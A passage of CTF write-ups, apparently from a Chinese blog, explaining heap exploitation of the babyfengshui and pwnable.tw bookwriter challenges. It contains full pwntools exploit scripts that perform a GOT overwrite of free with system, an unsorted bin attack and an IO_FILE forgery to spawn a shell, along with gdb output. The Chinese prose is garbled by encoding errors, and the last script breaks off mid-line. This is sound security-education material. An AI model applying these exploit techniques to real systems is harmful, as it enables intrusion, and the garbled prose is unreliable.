ï¼Œåšäº†è¿™ä¹ˆä¸€ä»¶äº‹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚é¦–å…ˆåˆ›å»ºä¸€ä¸ªå †å—ç”¨æ¥å­˜æ”¾descriptionä¿¡æ¯ï¼Œç”¨`*S`æŒ‡å‘å®ƒï¼›å†åˆ›å»ºä¸€ä¸ªå †å—ï¼Œç”¨`*V2`æŒ‡å‘å®ƒï¼Œå‰å››ä¸ªå­—èŠ‚å­˜æ”¾descriptionçš„åœ°å€ï¼Œåé¢ç”¨æ¥å­˜æ”¾åå­—nameï¼›æœ€åå°†bssæ®µçš„ptr[0]æŒ‡å‘`*V2`è¿™ä¸ªå †å—ã€‚å¹¶å°†byte_804b069è‡ªåŠ 1ï¼Œè¿™ä¸ªå€¼ç›¸å½“äºè®°å½•ç›®å‰ä¸€å…±ç”³è¯·äº†å¤šå°‘ä¸ªuserã€‚\n\n![](babyfengshui-1.png)\n\n### åˆ é™¤ç”¨æˆ·\n\n```c\nprintf(\"index: \");\n__isoc99_scanf(\"%d\", &v2);\ndel_user(v2);\n\nunsigned int __cdecl del_user(unsigned __int8 index)\n{\n  unsigned int v2; // [esp+1Ch] [ebp-Ch]\n\n  v2 = __readgsdword(0x14u);\n  if ( index < (unsigned __int8)user_num && ptr[index] )\n  {\n    free(*(void **)ptr[index]);\n    free(ptr[index]);\n    ptr[index] = 0;\n  }\n  return __readgsdword(0x14u) ^ v2;\n}\n```\n\nåˆ é™¤ç”¨æˆ·çš„ä»£ç ä¸­ï¼Œå°†ä¸€ä¸ªç”¨æˆ·æ‹¥æœ‰çš„ä¸¤ä¸ªå †å—åˆ†åˆ«é‡Šæ”¾ï¼Œå¹¶å°†bssæ®µå¯¹åº”çš„ptr[n]ç½®0ã€‚è™½ç„¶æ­¤æ—¶`*V2`çš„å‰å››ä¸ªå­—èŠ‚è¿˜æŒ‡å‘`*S`ï¼Œä½†å½“å †å—è¢«æ‰”åˆ°binä¸­æ—¶ï¼Œä¼šåšæ¸…ç†ï¼Œå› æ­¤ä¸ä¼šé€ æˆé—®é¢˜ã€‚\n\n### å±•ç¤ºç”¨æˆ·ä¿¡æ¯\n\n```c\nprintf(\"index: \");\n__isoc99_scanf(\"%d\", &v2);\ndisp_user(v2);\n\nunsigned int __cdecl disp_user(unsigned __int8 index)\n{\n  unsigned int v2; // [esp+1Ch] [ebp-Ch]\n\n  v2 = __readgsdword(0x14u);\n  if ( index < (unsigned __int8)user_num && ptr[index] )\n  {\n    printf(\"name: %s\\n\", (char *)ptr[index] + 4);\n    printf(\"description: %s\\n\", *(_DWORD *)ptr[index]);\n  }\n  return __readgsdword(0x14u) ^ v2;\n}\n```\n\nè¿™ä¸ªå‡½æ•°å¾ˆç®€å•ï¼Œæ ¹æ®ç»™å®šçš„indexï¼Œå°†ç”¨æˆ·çš„nameå’Œdescriptionä¿¡æ¯æ‰“å°å‡ºæ¥ã€‚é€šè¿‡è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æˆ‘ä»¬å¯ä»¥çŒœæµ‹ï¼Œä¹‹åæ³„éœ²ä¿¡æ¯ä¸€å®šè¦ç”¨åˆ°å®ƒã€‚\n\n### å‡çº§ç”¨æˆ·ä¿¡æ¯\n\n```c\nprintf(\"index: \");\n__isoc99_scanf(\"%d\", &v2);\nupdate_description(v2);\n\nunsigned int __cdecl update_description(unsigned __int8 index)\n{\n  char v2; // [esp+17h] [ebp-11h]\n  int v3; // [esp+18h] [ebp-10h]\n  unsigned int v4; // [esp+1Ch] [ebp-Ch]\n\n  v4 = __readgsdword(0x14u);\n  if ( index < (unsigned __int8)user_num && ptr[index] )\n  {\n    v3 = 0;\n    printf(\"text length: \");\n    __isoc99_scanf(\"%u%c\", &v3, &v2);\n    if ( (char *)(v3 + *(_DWORD *)ptr[index]) >= (char *)ptr[index] - 4 )\n    {\n      puts(\"my l33t defenses cannot be fooled, cya!\");\n      exit(1);\n    }\n    printf(\"text: \");\n    get_v1(*(char **)ptr[index], v3 + 1);\n  }\n  return __readgsdword(0x14u) ^ v4;\n}\n```\n\nå‡çº§ç”¨æˆ·ä¿¡æ¯è¿™ä¸ªå‡½æ•°ä¹ä¸€çœ‹æ²¡çœ‹å‡ºé—®é¢˜ï¼Œå°±æ˜¯ä¸å¤ªæ˜ç™½`(char *)(v3 + *(_DWORD *)ptr[index]) >= (char *)ptr[index] - 4`è¿™ä¸€ä¸ªåˆ¤æ–­çš„ä½œç”¨æ˜¯å•¥ï¼Œä»¥ä¸ºä¸ä¼šæœ‰æ¼æ´ç‚¹å°±è·³è¿‡äº†ã€‚è°çŸ¥é“ï¼ï¼é—®é¢˜å°±å‡ºåœ¨è¿™å„¿ï¼ï¼\n\nè¿™ä¸€åˆ¤æ–­çš„ç›®çš„æ˜¯ï¼Œä¿è¯å½“å‰ç”¨æˆ·çš„descriptionå—ä¸ä¼šè¦†ç›–nameå—ã€‚å¦‚æœåˆ†é…ç»™ä¸€ä¸ªç”¨æˆ·çš„ä¸¤ä¸ªå †å—æ˜¯ç›¸é‚»çš„ï¼Œä¸”descriptionå—åœ¨ä½åœ°å€ï¼Œnameå—åœ¨é«˜åœ°å€çš„è¯ï¼Œè¿™ä¸ªåˆ¤æ–­æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚ä½†æ˜¯å¦‚æœè¿™ä¸¤ä¸ªå †å—ä¸ç›¸é‚»ï¼Œé‚£ä¹ˆé—®é¢˜å°±æ¥äº†ï¼Œä½äºdescriptionå—å’Œnameå—ä¹‹é—´çš„æ‰€æœ‰å †å—éƒ½å¯ä»¥è¢«æˆ‘ä»¬çš„è¾“å…¥è¦†ç›–ã€‚\n\nå› æ­¤ï¼Œæˆ‘ä»¬åªè¦æ„é€ ä¸€ä¸ªç”¨æˆ·ï¼Œå…¶ä¸¤ä¸ªå †å—åœ¨å¦ä¸€ä¸ªç”¨æˆ·å †å—descriptionå—å’Œnameå—ä¹‹é—´å³å¯ã€‚\n\n### åˆ©ç”¨åˆ†æ\n\nä»¥æ·»åŠ ç¬¬ä¸€ä¸ªç”¨æˆ·ä¸ºä¾‹ï¼Œéœ€è¦æˆ‘ä»¬æŒ‡å®šdescriptionçš„å †å—å¤§å°ï¼Œè¿˜ä¼šç”³è¯·ä¸€ä¸ªå›ºå®šå¤§å°0x80çš„å †å—ï¼ˆè¯¥å †å—è¢«é‡Šæ”¾åä¼šè¿›å…¥unsorted binï¼‰ã€‚å¦‚æœæŒ‡å®šdescriptionå¤§å°ä¸ºfast binçš„å¤§å°ï¼Œé‚£ä¹ˆå½“åˆ é™¤è¿™ä¸ªç”¨æˆ·æ—¶ï¼ˆéç¬¬ä¸€ä¸ªç”¨æˆ·ï¼Œå› ä¸ºç¬¬ä¸€ä¸ªç”¨æˆ·çš„å †chunkç´§æŒ¨ç€top chunkï¼Œé‡Šæ”¾åä¼šè·Ÿtop chunkåˆå¹¶è€Œéè¿›å…¥binä¸­ï¼‰ï¼Œdescriptionå—ä¼šè¿›å…¥fast binï¼Œè€Œnameå—ä¼šè¿›å…¥unsorted binï¼ˆ0x80ï¼‰ã€‚\n\nè¿™æ—¶ï¼Œå¦‚æœæˆ‘ä»¬æ·»åŠ ä¸€ä¸ªç”¨æˆ·ï¼Œå¹¶ä¸”æŒ‡å®šdescriptionå¤§å°ä¸º0x80ï¼Œé‚£ä¹ˆunsorted binä¸­çš„é‚£ä¸ªå—ä¼šè¢«åˆ†é…ç»™è¿™ä¸ªç”¨æˆ·çš„descriptionï¼Œç„¶åå†æ–°ç”Ÿæˆä¸€ä¸ª0x80å¤§å°çš„chunkç»™è¿™ä¸ªç”¨æˆ·åšnameå—ã€‚å› æ­¤å°±æ„é€ äº†å¦‚ä¸‹å›¾æ‰€ç¤ºçš„ä¸¤ä¸ªç”¨æˆ·å †å—å…³ç³»ï¼š\n\n![](babyfengshui-2.png)\n\nè¿™æ ·æˆ‘ä»¬è°ƒç”¨â€œå‡çº§ç”¨æˆ·ä¿¡æ¯â€å‡½æ•°æ›´æ”¹description Açš„å€¼ï¼Œä½¿name Bçš„å‰å››ä¸ªå­—èŠ‚è¢«è¦†ç›–ä¸ºgotè¡¨ä¸­çš„freeè¡¨é¡¹(æ³„éœ²freeåœ°å€ï¼Œæˆ‘ä»¬è¦ç”¨`ï¼ˆ1ï¼‰systemæ›¿æ¢freeï¼ˆ2ï¼‰å°†description Açš„å‰å‡ ä¸ªå­—èŠ‚æ”¹æˆâ€œ/bin/sh\\x00â€`ï¼Œè¿™æ ·åœ¨åˆ é™¤ç”¨æˆ·free(S)æ—¶ï¼Œå°±å»æ‰§è¡Œäº†`system(\"/bin/sh\\x00\")`)ï¼Œè¿™æ ·å½“æˆ‘ä»¬è°ƒç”¨æ‰“å°ä¿¡æ¯æ—¶ï¼Œä¼šå»æ‰“å°freeè¿™ä¸ªgotè¡¨é¡¹å­˜æ”¾çš„çœŸæ­£çš„freeå‡½æ•°åœ°å€ï¼Œä»è€Œæ³„éœ²å‡ºfreeå‡½æ•°åœ°å€ï¼ˆæ ¹æ®è¯¥åœ°å€ï¼Œç»“åˆå¯¹åº”çš„libcç‰ˆæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥ç®—å‡ºlibcåŸºå€å’Œsystemå‡½æ•°åœ°å€ï¼‰ã€‚\n\nè·å¾—systemå‡½æ•°åœ°å€åï¼Œæˆ‘ä»¬è°ƒç”¨å‡çº§Bç”¨æˆ·ä¿¡æ¯ï¼Œå°†systemåœ°å€å†™å…¥gotè¡¨ä¸­çš„freeè¡¨é¡¹ï¼Œä»è€Œå®ç°äº†freeå‡½æ•°çš„åŠ«æŒã€‚ç„¶ååœ¨ä¹‹å‰å¾€description Aä¸­å†™ä¿¡æ¯æ—¶ï¼Œå°†\"/bin/sh\\x00\"å†™åœ¨èµ·å§‹ä½ç½®ã€‚æœ€åï¼Œè°ƒç”¨åˆ é™¤å‡½æ•°åˆ é™¤ç”¨æˆ·Açš„ä¿¡æ¯ï¼Œå°±å¯ä»¥å®ç°get shellåˆ©ç”¨äº†ã€‚\n\n# 2 exp\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./babyfengshui')\n#myproc = process(myelf.path)\nmyproc = remote(\"159.138.137.79\",65054)\n\ndef add_user(size,name,text_length,text):\n    myproc.recvuntil(\"Action: \")\n    myproc.sendline(str(0))\n    myproc.recvuntil(\"size of description: \")\n    myproc.sendline(str(size))\n    myproc.recvuntil(\"name: \")\n    myproc.sendline(name)\n    myproc.recvuntil(\"text length: \")\n    myproc.sendline(str(text_length))\n    myproc.recvuntil(\"text: \")\n    myproc.sendline(text)\n\ndef del_user(user_index):\n    myproc.recvuntil(\"Action: \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"index: \")\n    myproc.sendline(str(user_index))\n\ndef disp_user(user_index):\n    myproc.recvuntil(\"Action: \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"index: \")\n    myproc.sendline(str(user_index))\n\ndef update_description(user_index,text_length,text):\n    myproc.recvuntil(\"Action: \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"index: \")\n    myproc.sendline(str(user_index))\n    myproc.recvuntil(\"text length: \")\n    myproc.sendline(str(text_length))\n    myproc.recvuntil(\"text: \")\n    myproc.sendline(text)\n\nadd_user(0x10,'name0',0x10,'text0')\nadd_user(0x10,'name1',0x10,'text1')\ndel_user(0)\nadd_user(0x80,'name2',0x80,'text2')\n\npayload = \"/bin/sh\\x00\"+\"a\"*(0xa0 - len(\"/bin/sh\\x00\")) + p32(myelf.got['free'])\nupdate_description(2,len(payload),payload)\ndisp_user(1)\nmyproc.recvuntil('description: ')\nfree_addr = u32(myproc.recv(4))\n\nlibc_base = free_addr - 0x070750\nsystem_addr =  libc_base + 0x03a940\n\n# å°†freeå‡½æ•°çš„gotè¡¨é¡¹å†™æˆsystemå‡½æ•°åœ°å€\nupdate_description(1,4,p32(system_addr))\n\ndel_user(2)\n#gdb.attach(myproc)\n\nmyproc.interactive()\n```\n\n# 3 libcç‰ˆæœ¬\n\næ ¹æ®æ³„éœ²çš„å‡½æ•°åœ°å€çš„åä¸‰ä½å¯ä»¥ç¡®å®šå¯¹åº”çš„libcç‰ˆæœ¬ï¼Œå…·ä½“æ“ä½œè§å¦‚ä¸‹é“¾æ¥ã€‚\n\nå‚è€ƒé“¾æ¥ï¼š\nhttps://www.jianshu.com/p/8d2552b8e1a2\nhttps://libc.blukat.me/\n\n# 4 é¢˜ç›®å‚è€ƒé“¾æ¥\n\nhttps://blog.csdn.net/Breeze_CAT/article/details/103788631\n","tags":["heap","å †é£æ°´"],"categories":["CTF"]},{"title":"pwnable.twä¹‹bookwriter","url":"/2020/04/04/bookwriter/","content":"\n[é¢˜ç›®é“¾æ¥](https://pwnable.tw/challenge/#24)\n\nå‚è€ƒwpï¼š\n\n[ã€PWNABLE.TWã€‘ BookWriter è§£é¢˜æ€è·¯](http://p4nda.top/2017/12/15/pwnable-tw-bookwriter/)\n\n[Pwnable.twä¹‹BookWriter](https://bbs.pediy.com/thread-226694.htm)\n\n# 1 åˆ†æ\n\næŸ¥çœ‹äºŒè¿›åˆ¶å„é¡¹å±æ€§ï¼š\n\n```shell\n$ file bookwriter\nbookwriter: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8c3e466870c649d07e84498bb143f1bb5916ae34, stripped\n$ checksec bookwriter \n[*] '/mnt/hgfs/vmshare-1604/bookwriter/bookwriter'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n    FORTIFY:  Enabled\n\n```\n\n- 64ä½äºŒè¿›åˆ¶ç¨‹åºï¼ŒåŠ¨æ€é“¾æ¥ï¼Œå»äº†ç¬¦å·è¡¨\n- gotè¡¨ä¸å¯å†™\n- æ ˆä¸å¯æ‰§è¡Œï¼Œå¼€å¯æ ˆcanary\n- åœ°å€éšæœºåŒ–æœªå¼€å¯\n\nä½¿ç”¨IDAåˆ†æäºŒè¿›åˆ¶æºç é€»è¾‘ï¼Œå­˜åœ¨å››ä¸ªåŠŸèƒ½ï¼Œåˆ†åˆ«æ˜¯ï¼š\n\n- addï¼šæ·»åŠ pageå’Œå†…å®¹\n- viewï¼šæŸ¥çœ‹pageçš„å†…å®¹\n- editï¼šæ›´æ”¹pageçš„å†…å®¹ï¼Œå¹¶é‡æ–°è°ƒæ•´å¤§å°å€¼size\n- informationï¼šæ˜¾ç¤ºä½œè€…å§“å\n\næ¼æ´ç‚¹æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š\n\n- æœªè¿›å…¥whileå¾ªç¯å‰è¾“å…¥ä½œè€…å§“åæ—¶ï¼Œç»“æŸç¬¦æ§åˆ¶æœ‰é—®é¢˜ã€‚å¯¼è‡´åç»­æ‰“å°è¯¥å­—ç¬¦ä¸²æ—¶å¯è¶Šç•Œè¯»ã€‚\n- addå‡½æ•°ä¸­çš„if(i>8)åˆ¤æ–­æœ‰è¯¯ï¼Œå¯¼è‡´bssæ®µåŸæœ¬å­˜æ”¾sizeçš„ä½ç½®å¯è¢«è¦†ç›–ä¸ºå †åœ°å€\n- editå‡½æ•°ä¸­åŒæ ·å­˜åœ¨ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨è¾“å…¥å­—ç¬¦ä¸²æ—¶ï¼Œç»“æŸç¬¦æ§åˆ¶æœ‰é—®é¢˜ï¼Œå¯¼è‡´è®¡ç®—strlenæ—¶äº§ç”Ÿä¸€ä¸ªå¤§äºåŸæœ¬å­—ç¬¦ä¸²çš„å€¼ï¼Œåç»­å¯ä»¥è¶Šç•Œå†™ã€‚\n\n# 2 åˆ©ç”¨\n\n## 2.1 æ³„éœ²å †åœ°å€å’ŒlibcåŸºå€\n\næ³„éœ²å †åœ°å€å’Œlibcæµ‹è¯•ä»£ç ï¼š\n\n```\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf=ELF('./bookwriter')\nmylibc=ELF('./libc_64.so.6')\nmyproc=process(['./bookwriter'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n\ndef add_page(p_size,p_content):\n    myproc.recvuntil(\"Your choice :\")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"Size of page :\")\n    myproc.sendline(str(p_size))\n    myproc.recvuntil(\"Content :\")\n    myproc.send(p_content)\n\ndef view_page(p_index):\n    myproc.sendlineafter(\"Your choice :\",str(2))\n    myproc.sendlineafter(\"Index of page :\",str(p_index))\n#è·å–unsorted binä¸­ç¬¬ä¸€ä¸ªbinçš„topå€¼\n    myproc.recvuntil(\"yuan\")\n    top_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\n    return top_addr\n\ndef edit_page(p_index,p_content):\n    myproc.sendlineafter(\"Your choice :\",str(3))\n    myproc.sendlineafter(\"Index of page :\",str(p_index))\n    myproc.sendlineafter(\"Content:\",p_content)\n\ndef information(choice,p_author):\n    myproc.sendlineafter(\"Your choice :\",str(4))\n#è·å–.bssæ®µä¸­author_nameç›¸é‚»çš„pageæŒ‡é’ˆï¼Œå³å †åœ°å€\n    myproc.recvuntil(\"yuan\")\n    ret = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\n    myproc.sendlineafter(\"Do you want to change the author ? (yes:1 / no:0) \",str(choice))\n    if (choice == 1):\n        myproc.sendlineafter(\"Author :\",p_author)  \n    return ret\n    \n#æ³„éœ²å †åœ°å€\nmyproc.sendafter(\"Author :\",\"a\"*60+\"yuan\")     #æ„é€ 64å­—èŠ‚nameï¼Œåç»­æ‰“å°nameä¼šè¶Šç•Œæ‰“å°å‡ºå †åœ°å€\nadd_page(0x18,\"b\"*0x18)      \nedit_page(0,\"c\"*0x18)    #è®¡ç®—sizeçš„æ—¶å€™ä¼šæŠŠtop chunkçš„sizeå­—æ®µä¹Ÿç®—è¿›å»ï¼Œå¯¼è‡´ä¸‹ä¸€æ­¥å¯ä»¥å¤šå†™3å­—èŠ‚\nedit_page(0,\"\\x00\"*0x18+\"\\xe1\\x0f\\x00\")    #å°†page0çš„å†…å®¹æ”¹ä¸ºç©ºï¼Œåˆ™page0çš„sizeå­—æ®µä¸ºç©ºï¼Œå¯ç»•è¿‡add_pageä¸­å¯¹page[8]çš„æ£€æŸ¥ã€‚æœ€åä¸‰ä¸ªå­—èŠ‚æ›´æ”¹top chunkçš„å¤§å°ï¼Œä½¿å…¶è¿›å…¥unsorted binä¸­ï¼Œä»è€Œæ³„éœ²topåœ°å€\nheap_addr = information(0,0)    #è·å–page[0]ä¸Šçš„å †åœ°å€\nlog.warn(\"heap addr: 0x%x \" % heap_addr)\n\n#æ³„éœ²libc\nfor i in range(0,8):\n    add_page(0x64,\"a\"*4+\"yuan\")\ntop_addr = view_page(3)      # é™¤äº†ç¬¬ä¸€ä¸ªä»unsorted binä¸­åˆ†é…çš„å †å—ï¼Œæ— æ³•è·å¾—topåœ°å€ï¼Œå…¶ä»–éƒ½å¯\nlog.warn(\"top_addr: 0x%x\" % top_addr)\nlibc_base = top_addr - 0x58 - 0x3c3b20    #é€šè¿‡topåœ°å€ï¼Œè®¡ç®—libcåŸºå€ã€‚0x58å¯ä»¥åœ¨å †è°ƒè¯•ä¸­çœ‹åˆ°,0x3c3b20æ˜¯æŸ¥çœ‹libc.soä¸­malloc_trimå‡½æ•°ä¸­å˜é‡çš„åç§»è·å–åˆ°çš„ã€‚\nlog.warn(\"libc_base: 0x%x\" % libc_base)\n\ngdb.attach(myproc)\nmyproc.interactive()\n```\n\n\n\n## 2.2 get shell\n\né€šè¿‡ä»¥ä¸Šä»£ç ï¼Œå·²ç»å¯ä»¥å®ç°å¾€ç¬¬0ä¸ªå †ä¸Šå†™è¶…é•¿æ•°æ®ï¼Œä»è€Œè¦†ç›–å †ç©ºé—´å…¶ä»–éƒ¨åˆ†äº†ã€‚\n\nç°åœ¨è¿˜éœ€è¦è§£å†³å‡ ä¸ªé—®é¢˜ï¼š\n\nï¼ˆ1ï¼‰é€šè¿‡unsortedbin attackå°†IO_list_allè¦†ç›–ä¸ºæˆ‘ä»¬å¯å†™çš„å†…å­˜åœ°å€ï¼Œä»è€Œä¼ªé€ IO_FILE_plusç»“æ„ä½“\n\né—®é¢˜1ï¼šä½†æ˜¯é€šè¿‡unsortedbin attackåªèƒ½å°†IO_list_allè¦†ç›–ä¸ºmainarena+0x58ï¼ˆ64ä½ï¼‰ï¼Œè¯¥ç©ºé—´æ˜¯æˆ‘ä»¬ä¸å¯æ§çš„ï¼Œä¸”ç©ºé—´çš„æ¡ä»¶å†…ä¸æ»¡è¶³æ‰§è¡Œ_IO_OVERFLOWï¼Œå› æ­¤ä¼šè½¬å»å¯»æ‰¾chainè¿™ä¸ªåœ°å€ã€‚\n\nï¼ˆ2ï¼‰æ­¤æ—¶chainçš„ä½ç½®æ­£å¥½æ˜¯small binçš„åŒºåŸŸï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªèƒ½æ§åˆ¶çš„small bin chunk\n\né—®é¢˜2ï¼šæ€ä¹ˆè·å¾—è¿™ä¸ªå¯æ§åˆ¶çš„small bin chunkå‘¢ï¼Ÿå°†unsorted bin chunkä¸­çš„chunkå¤§å°æ”¹ä¸€ä¸‹ï¼Œæ”¹æˆsmall binå¤§å°ï¼Œè¿™æ ·ä»unsorted binä¸­æ‹†ä¸‹çš„chunkå°±ä¼šè¢«é“¾æ¥åˆ°å¯¹åº”å¤§å°çš„small binä¸Šã€‚\n\né—®é¢˜3ï¼šè¿™ä¸ªå¤§å°åº”è¯¥å¤šå¤§å‘¢ï¼Ÿæ ¹æ®ï¼ˆ1ï¼‰ä¸­chainçš„ä½ç½®æ¥ç¡®å®šï¼Œæœ¬é¢˜æ˜¯0x60ã€‚\n\n### unsorted bin attack\n\nå‚è€ƒctf-wikiï¼š[unsorted bin attack](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/)\n\nåˆ©ç”¨è¯¥æ–¹æ³•å¯ä»¥å¾€ä»»æ„åœ°å€å†™ä¸€ä¸ªå›ºå®šçš„å€¼ã€‚æœ¬é¢˜ä¸­å¯ä»¥å°†main_arena+0x58çš„åœ°å€å†™åˆ°IO_list_allä¸Šï¼ˆå°†IO_list_all - 0x10çš„åœ°å€æ”¾åœ¨unsorted chunkçš„bkå¤„ï¼‰ï¼Œä»è€Œå°†IO_FILE_plusè½¬ç§»ã€‚ç”±äºmain_arenaä¸æ»¡è¶³æ¡ä»¶ï¼Œä¼šç»§ç»­è½¬ç§»ã€‚IO_FILEä¸­chainçš„ä½ç½®æ­£å¥½åœ¨0x60å¤§å°small binçš„bkå¤„ã€‚å¦‚ä¸‹å›¾ï¼Œæ„é€ ä¸€ä¸ª0x60å¤§å°çš„unsorted binï¼Œmallocæ—¶ä¼šå°†è¯¥unsorted binæ”¾åˆ°chunk(IO_FILE)ä½ç½®ã€‚è€Œunsorted bin chunkçš„å¤§éƒ¨åˆ†åŒºåŸŸæˆ‘ä»¬éƒ½å¯ä»¥é€šè¿‡å †æº¢å‡ºæ¥ä»»æ„å†™ã€‚\n\n![](bookwriter-1.png)\n\n### I/O FILE\n\nä»¥ä¸Šåˆ†æå¯çŸ¥ï¼Œæˆ‘ä»¬ç°åœ¨éœ€è¦åœ¨unsorted bin chunké‡Œå¸ƒå±€IO_FILE_plusç»“æ„ä½“ï¼Œæœ‰ä¸€äº›é™åˆ¶æ¡ä»¶ï¼Œåœ¨å‚è€ƒé“¾æ¥ä¸­æœ‰æåŠï¼Œè¿™é‡Œä¸å¤è¿°ã€‚å› æ­¤ï¼Œé€šè¿‡å †æº¢å‡ºåœ¨ç¬¬0å·å †å—ä¸Šå¸ƒå±€å¦‚ä¸‹ï¼š\n\n![](bookwriter-2.png)\n\næŒ‰ç…§å¦‚ä¸Šæ„é€ åï¼Œåœ¨gefä¸­è°ƒè¯•æ‰“å°å¦‚ä¸‹ï¼š\n\n```shell\ngefâ¤  heap chunks\nChunk(addr=0x1c91010, size=0x20, flags=PREV_INUSE)\n    [0x0000000001c91010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]\ngefâ¤  x/50gx 0x1c91010+0x390\n0x1c913a0:\t0x0068732f6e69622f\t0x0000000000000061\n0x1c913b0:\t0x0000000000000000\t0x00007f9ecc967510\n0x1c913c0:\t0x0000000000000002\t0x0000000000000003\n0x1c913d0:\t0x0000000000000000\t0x0000000000000000\n0x1c913e0:\t0x0000000000000000\t0x0000000000000000\n0x1c913f0:\t0x0000000000000000\t0x0000000000000000\n0x1c91400:\t0x0000000000000000\t0x0000000000000000\n0x1c91410:\t0x0000000000000000\t0x0000000000000000\n0x1c91420:\t0x0000000000000000\t0x0000000000000000\n0x1c91430:\t0x0000000000000000\t0x0000000000000000\n0x1c91440:\t0x0000000000000000\t0x0000000000000000\n0x1c91450:\t0x0000000000000000\t0x0000000000000000\n0x1c91460:\t0xffffffffffffffff\t0x0000000000000000\n0x1c91470:\t0x0000000000000000\t0x0000000001c91480\n0x1c91480:\t0x0000000000000000\t0x0000000000000000\n0x1c91490:\t0x0000000000000001\t0x00007f9ecc5e7390\n0x1c914a0:\t0x0000000000000000\t0x0000000000000000\n0x1c914b0:\t0x0000000000000000\t0x0000000000000000\n0x1c914c0:\t0x0000000000000000\t0x0000000000000000\n0x1c914d0:\t0x0000000000000000\t0x0000000000000000\n0x1c914e0:\t0x0000000000000000\t0x0000000000000000\n0x1c914f0:\t0x0000000000000000\t0x0000000000000000\n0x1c91500:\t0x0000000000000000\t0x0000000000000000\n0x1c91510:\t0x0000000000000000\t0x0000000000000000\n0x1c91520:\t0x0000000000000000\t0x0000000000000000\ngefâ¤  p *(struct _IO_FILE_plus*)0x1c913a0\n$1 = {\n  file = {\n    _flags = 0x6e69622f, \n    _IO_read_ptr = 0x61 <error: Cannot access memory at address 0x61>, \n    _IO_read_end = 0x0, \n    _IO_read_base = 0x7f9ecc967510 \"\", \n    _IO_write_base = 0x2 <error: Cannot access memory at address 0x2>, \n    _IO_write_ptr = 0x3 <error: Cannot access memory at address 0x3>, \n    _IO_write_end = 0x0, \n    _IO_buf_base = 0x0, \n    _IO_buf_end = 0x0, \n    _IO_save_base = 0x0, \n    _IO_backup_base = 0x0, \n    _IO_save_end = 0x0, \n    _markers = 0x0, \n    _chain = 0x0, \n    _fileno = 0x0, \n    _flags2 = 0x0, \n    _old_offset = 0x0, \n    _cur_column = 0x0, \n    _vtable_offset = 0x0, \n    _shortbuf = \"\", \n    _lock = 0x0, \n    _offset = 0x0, \n    _codecvt = 0x0, \n    _wide_data = 0x0, \n    _freeres_list = 0x0, \n    _freeres_buf = 0x0, \n    __pad5 = 0x0, \n    _mode = 0xffffffff, \n    _unused2 = \"\\377\\377\\377\\377\", '\\000' <repeats 15 times>\n  }, \n  vtable = 0x1c91480\n}\ngefâ¤  p *(struct _IO_jump_t*)0x1c91480\n$2 = {\n  __dummy = 0x0, \n  __dummy2 = 0x0, \n  __finish = 0x1, \n  __overflow = 0x7f9ecc5e7390 <__libc_system>, \n  __underflow = 0x0, \n  __uflow = 0x0, \n  __pbackfail = 0x0, \n  __xsputn = 0x0, \n  __xsgetn = 0x0, \n  __seekoff = 0x0, \n  __seekpos = 0x0, \n  __setbuf = 0x0, \n  __sync = 0x0, \n  __doallocate = 0x0, \n  __read = 0x0, \n  __write = 0x0, \n  __seek = 0x0, \n  __close = 0x0, \n  __stat = 0x0, \n  __showmanyc = 0x0, \n  __imbue = 0x0\n}\n```\n\n# 3 EXP\n\n```\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf=ELF('./bookwriter')\nmylibc=ELF('./libc_64.so.6')\nmyproc=remote(\"chall.pwnable.tw\",10304)\n#myproc=process(['./bookwriter'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n#mylibc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')\n#myproc=process(myelf.path)\n\ndef add_page(p_size,p_content):\n    myproc.recvuntil(\"Your choice :\")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"Size of page :\")\n    myproc.sendline(str(p_size))\n    myproc.recvuntil(\"Content :\")\n    myproc.send(p_content)\n\ndef view_page(p_index):\n    myproc.sendlineafter(\"Your choice :\",str(2))\n    myproc.sendlineafter(\"Index of page :\",str(p_index))\n    myproc.recvuntil(\"aaaaaaaa\")\n    top_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\n    return top_addr\n\ndef edit_page(p_index,p_content):\n    myproc.sendlineafter(\"Your choice :\",str(3))\n    myproc.sendlineafter(\"Index of page :\",str(p_index))\n    myproc.sendlineafter(\"Content:\",p_content)\n\ndef information(choice,p_author):\n    myproc.sendlineafter(\"Your choice :\",str(4))\n    myproc.recvuntil(\"yuan\")\n    ret = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\n    myproc.sendlineafter(\"Do you want to change the author ? (yes:1 / no:0) \",str(choice))\n    if (choice == 1):\n        myproc.sendlineafter(\"Author :\",p_author)  \n    return ret\n\nmyproc.sendafter(\"Author :\",\"a\"*60+\"yuan\")\nadd_page(0x18,\"b\"*0x18)\nedit_page(0,\"c\"*0x18)\nedit_page(0,\"\\x00\"*0x18+\"\\xe1\\x0f\\x00\")\nheap_addr = 